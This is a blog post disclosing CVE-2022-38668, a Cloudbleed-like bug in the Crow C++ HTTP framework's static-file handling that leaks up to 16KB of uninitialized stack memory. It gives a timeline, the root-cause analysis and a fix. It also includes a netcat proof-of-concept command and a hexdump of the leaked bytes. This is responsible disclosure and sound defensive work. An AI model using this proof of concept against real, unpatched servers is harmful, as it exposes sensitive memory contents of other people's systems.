  + [invisible things (old)](http://theinvisiblethings.blogspot.com/)
  + [liveoverflow's site](http://liveoverflow.com/)
  + [/dev/null's site](https://d3vnull.com/)
  + [pi3's blog](http://blog.pi3.com.pl/)
  + [icewall's blog](http://icewall.pl/)
  + [taviso's blog](http://blog.cmpxchg8b.com/)
  + [pawel's blog](http://wampir.mroczna-zaloga.org/)
  + [sandeep's blog](http://www.sandeepkamble.com/)
  + [koto's blog](http://blog.kotowicz.net/)
  + [carstein's blog](http://128nops.blogspot.ch/)
  + [zaufana trzecia strona](http://zaufanatrzeciastrona.pl/)
  + [niebezpiecznik](https://niebezpiecznik.pl/)
  + [sekurak](https://sekurak.pl/)
* **Reverse Eng./Low-Level:**
  + [rewolf's blog](http://blog.rewolf.pl/blog/)
  + [gdtr](http://gdtr.wordpress.com/)
  + [spinning mirrors](http://omeg.pl/)
  + [security news](https://www.secnews.pl/)
  + [rev3rsed](http://rev3rsed.blogspot.com/)
* **Programming/Code:**
  + [/dev/krzaq](https://dev.krzaq.cc/)
  + [sil2100/vx's web log](http://sil2100.vexillium.org/)
  + [adam sawicki](http://asawicki.info/)
  + [devkk.net](http://devkk.net/)
  + [xion.log](http://xion.org.pl/)

### *Posts*

* [Paged Out! #5 is out,](?id=797)
* [CVEs of SSH talk this Thursday,](?id=796)
* [Debug Log: Internet doesn't work (it was the PSU),](?id=793)
* [FAQ: The tragedy of low-level exploitation,](?id=791)
* [Solving Hx8 Teaser 2 highlight videos!,](?id=789)
* [Gynvael on SECURITYbreak podcast,](?id=788)
* [Paged Out! #4 is out,](?id=786)
* [I won't be able to attend CONFidence'24 after all :(,](?id=785)
* [xz/liblzma: Bash-stage Obfuscation Explained,](?id=782)
* [Two of my bookmarklets: image extraction and simple TTS,](?id=781)
* [→ see all posts on main page](/)

// copyright © Gynvael Coldwind

// design & art by Xa

// logo font (birdman regular) by utopiafonts / Dale Harris

/\* the author and owner of this blog hereby allows anyone to test the security of this blog (on HTTP level only, the server is not mine, so let's leave it alone ;>), and try to break in (including successful breaks) without any consequences of any kind (DoS attacks are an exception here) ... I'll add that I planted in some places funny photos of some kittens, there are 7 of them right now, so have fun looking for them ;> let me know if You find them all, I'll add some congratz message or sth ;> \*/

**Vulns found in blog:**

\* XSS *(pers, user-inter)* by ged\_

\* XSS *(non-pers)* by Anno & Tracerout

\* XSS *(pers)* by Anno & Tracerout

\* Blind SQLI by Sławomir Błażek

\* XSS *(pers) by* Sławomir Błażek

2022-09-23:
## [Crowbleed (Crow HTTP framework vulnerability)](?id=752)

vulnerability:crow
![Crow framework logo stylized with bleeding letters.](img/crowbleed.png)

**(Collaborative post by Gynvael Coldwind and [hebi](https://github.com/0xhebi/CVEs/blob/main/Crow/CVE-2022-38668.md))**

Crow is an asynchronous C++ HTTP/WebSocket framework for creating "flask-like" web services. While analyzing [another vulnerability](/?lang=en&id=753) we've found a Cloudbleed-like information disclosure bug in the code path responsible for serving static files. Technically no special action on attacker's side was required - it was enough to request a static file smaller than 16KB and the server would send the file padded with uninitialized stack content (up to 16KB) back.

The vulnerability in question was reported mid-August and fixed within 6 days.

#### CVSS, CVE, etc

Human readable details are in the next section.

* **CVE**: CVE-2022-38668
* **CVSS 3.1**: 5.3 Medium (AV:N/AC:L/PR:N/UI:N/S:U/**C:L**/I:N/A:N) [as originally reported]
* **CVSS 3.1**: 7.5 High (AV:N/AC:L/PR:N/UI:N/S:U/**C:H**/I:N/A:N) [as rated by NIST/NVD]

#### Timeline

* 2022-08-14: Vulnerability discovered.
* 2022-08-17: Vulnerability reported.
* 2022-08-21: Public fix was proposed.
* 2022-08-22: Public fix was merged in.
* 2022-08-22: CVE requested and assigned.
* 2022-09-23: Details were published.

#### Original report with details

`*** Summary:
Affected: Crow version 1.0+4 and older
<https://github.com/CrowCpp/Crow> - maintained version (fork)
<https://github.com/ipkn/crow> - original version
Discovered by:
Gynvael Coldwind
hebi
Method of discovery:
Manual Analysis (reading the code)
"Crow is a C++ framework for creating HTTP or Websocket web services. It uses
routing similar to Python's Flask which makes it easy to use. It is also
extremely fast, beating multiple existing C++ frameworks as well as non C++
frameworks." (source: project's README.md)
Crow versions prior 1.0+4 (included) are vulnerable to an Information Disclosure
("Exposure of Sensitive Information to an Unauthorized Actor") issue, due to
improper handling of static resources.
Any request to a static resource, where the static resource is smaller than
16KB, will lead to disclosing up to 16KB of data from the stack.
IMPORTANT: This vulnerability is reported under the 90-day policy
(version 2021), i.e. this report will be shared publicly with the defensive
community on 16th November 2022 if a patch/fix is not available by that time, or
30 days after the fix becomes available. For details please see:
<https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html>
*** Vulnerability details and exploit
The vulnerability is located in the Connection::do_write_static* method within
the http_connection.h file.
* <https://github.com/CrowCpp/Crow/blob/master/include/crow/http_connection.h#L393>
This function creates a local buffer with a fixed size of 16384 bytes. Then the
buffer is passed to is.read() method (where "is" denotes an opened local file
pointed to by the static resource mapping) to acquire the content of the given
static resource (file). This call made within a while loop's condition, which
checks if any data was read (if not, the loop will exit).
However, the number of bytes that were read is not being tracked in any form.
Furthermore, the whole buffer is then passed to asio::buffer without specified
size**.
** In this case it means that the whole array size will be used as data size, as
per the following constructor description:
<https://www.boost.org/doc/libs/1_80_0/doc/html/boost_asio/reference/buffer/overload7.html>
This in turn leads to the whole local buffer being sent to the client requesting
the resource, including the potentially uninitialized part. This is especially
true for files smaller than 16KB.
Conditions for triggering this behavior are:
1. Static path needs to be defined.
2. At least 1 static file needs to exist.
3. The file needs to be smaller than 16KB.
*** Exploit
$ cat poc.txt | nc -v 127.0.0.1 18080 | hexdump -C
localhost [127.0.0.1] 18080 (?) open
00000000 48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d |HTTP/1.1 200 OK.|
00000010 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 74 |.Content-Type: t|
00000020 65 78 74 2f 70 6c 61 69 6e 0d 0a 43 6f 6e 74 65 |ext/plain..Conte|
00000030 6e 74 2d 4c 65 6e 67 74 68 3a 20 35 0d 0a 53 65 |nt-Length: 5..Se|
00000040 72 76 65 72 3a 20 43 72 6f 77 2f 6d 61 73 74 65 |rver: Crow/maste|
00000050 72 0d 0a 44 61 74 65 3a 20 54 75 65 2c 20 31 36 |r..Date: Tue, 16|
00000060 20 41 75 67 20 32 30 32 32 20 32 32 3a 34 39 3a | Aug 2022 22:49:|
00000070 32 32 20 47 4d 54 0d 0a 43 6f 6e 6e 65 63 74 69 |22 GMT..Connecti|
00000080 6f 6e 3a 20 4b 65 65 70 2d 41 6c 69 76 65 0d 0a |on: Keep-Alive..|
00000090 0d 0a 54 65 73 74 0a 00 00 00 00 00 00 00 00 00 |..Test..........|
000000a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
*
00002a90 00 00 00 00 00 00 00 00 00 00 28 14 00 ac d8 7f |..........(.....|
00002aa0 00 00 20 14 00 ac d8 7f 00 00 48 f8 8c b4 d8 7f |.. .......H.....|
00002ab0 00 00 50 f8 8c b4 d8 7f 00 00 49 8a 42 00 00 00 |..P.......I.B...|
00002ac0 00 00 28 14 00 ac d8 7f 00 00 20 14 00 ac d8 7f |..(....... .....|
00002ad0 00 00 03 00 00 00 00 00 00 00 11 00 00 00 00 00 |................|
00002ae0 00 00 28 14 00 ac d8 7f 00 00 20 14 00 ac d8 7f |..(....... .....|
00002af0 00 00 c0 f8 8c b4 d8 7f 00 00 cc 89 42 00 00 00 |............B...|
00002b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
00002b10 00 00 5b 00 00 00 6e 00 00 00 c0 1c 00 ac d8 7f |..[...n.........|
00002b20 00 00 b0 1c 00 ac d8 7f 00 00 01 00 00 00 00 00 |................|
00002b30 00 00 20 00 00 00 00 00 00 00 08 00 00 00 00 00 |.. .............|
00002b40 00 00 28 14 00 ac d8 7f 00 00 20 14 00 ac d8 7f |..(....... .....|
00002b50 00 00 b0 1c 00 ac d8 7f 00 00 40 f9 8c b4 d8 7f |..........@.....|
00002b60 00 00 f0 f8 8c b4 d8 7f 00 00 89 48 49 00 00 00 |...........HI...|
00002b70 00 00 28 3b 8d b4 d8 7f 00 00 30 14 00 ac d8 7f |..(;......0.....|
00002b80 00 00 40 f9 8c b4 d8 7f 00 00 48 f9 8c b4 d8 7f |..@.......H.....|
00002b90 00 00 50 f9 8c b4 d8 7f 00 00 99 47 49 00 00 00 |..P........GI...|
00002ba0 00 00 01 00 00 00 00 00 00 00 c8 04 8d b4 d8 7f |................|
00002bb0 00 00 30 f9 8c b4 d8 7f 00 00 b0 1c 00 ac d8 7f |..0.............|
00002bc0 00 00 01 00 00 00 00 00 00 00 c8 04 8d b4 d8 7f |................|
00002bd0 00 00 d0 1c 00 ac d8 7f 00 00 b0 1c 00 ac d8 7f |................|
00002be0 00 00 30 14 00 ac d8 7f 00 00 30 14 00 ac d8 7f |..0.......0.....|
00002bf0 00 00 90 f9 8c b4 d8 7f 00 00 00 53 2a 66 e1 24 |...........S*f.$|
00002c00 09 b2 30 14 00 ac d8 7f 00 00 60 ff ff ff ff ff |..0.......`.....|
...
*** Proposed fix:
Passing the actual size of bytes read to asio::buffer's constructor.`

## Add a comment:

| Nick: |  |
| --- | --- |
| URL (optional): |  |
| Math captcha: 7 ∗ 9 ＋ 1 = |  |
|  | |


